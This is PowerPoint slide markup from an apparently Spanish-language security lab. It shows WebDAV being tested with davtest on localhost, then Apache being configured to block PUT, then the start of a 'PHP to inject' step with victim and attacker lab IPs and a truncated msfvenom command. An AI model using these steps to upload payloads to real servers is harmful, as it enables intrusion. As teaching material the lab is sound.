            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>davtest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://localhost/webdav</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>Por defecto el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>PUT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> está permitido</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>Comprobar si funciona</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>		</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>http://localhost/webdav/</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pP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3" name="Imagen 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A227F678-0376-3130-FC85-8E9B0D914220}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4477732" y="4013995"/>
            <a:ext cx="4362233" cy="2738662"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{349CC860-F2FC-E6FB-43EA-3E02594C8BD3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4477732" y="887980"/>
            <a:ext cx="7587042" cy="3035952"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28190278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a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Configurar DAV en apache</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="CuadroTexto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DAB95837-215B-8785-46E0-BD6215D310B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-290233" y="870987"/>
            <a:ext cx="10404835" cy="5389296"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>vi /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>/apache2/sites-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>enabled</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>/000-default.conf</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>Lo configuramos para no permitir el PUT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>Probamos con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>davtest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> y no funciona</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>davtest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> http://localhost/webdav</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pP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3" name="Imagen 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6DB23036-A664-E42E-7DD5-6414EDECD441}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5708018" y="3721649"/>
            <a:ext cx="5234267" cy="2846470"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8ED8CAFC-4FA1-7F5B-CE4A-EEE4FD4C1733}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6493636" y="1008668"/>
            <a:ext cx="4118589" cy="2127684"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17094458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a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Configurar DAV en apache</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="CuadroTexto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DAB95837-215B-8785-46E0-BD6215D310B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="207390" y="887980"/>
            <a:ext cx="10404835" cy="1942198"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>Usando el LIMITEXCETPT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>Hace que no se pueda ni consultar</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>Ni poner un PUT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="es-E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pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Imagen 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{38AD2E62-382C-51BA-4AFF-FE63B4B67E9E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="443058" y="4383091"/>
            <a:ext cx="11588685" cy="930595"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Imagen 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CCD00563-E8BF-AD5F-5273-9F351CD42B59}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5104509" y="786841"/>
            <a:ext cx="5734850" cy="2819794"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37724808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a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Crear PHP para inyectar</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2ED1C577-E436-0136-B8F7-B53004D24061}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="747075" y="1078526"/>
            <a:ext cx="9575276" cy="1754326"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Necesitamos dos máquinas en red NAT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Validamos conexiones: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>	víctima: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>10.0.3.12</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>	atacante: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>10.0.3.8</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Desde</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </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el</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </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atacante</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>	</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msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
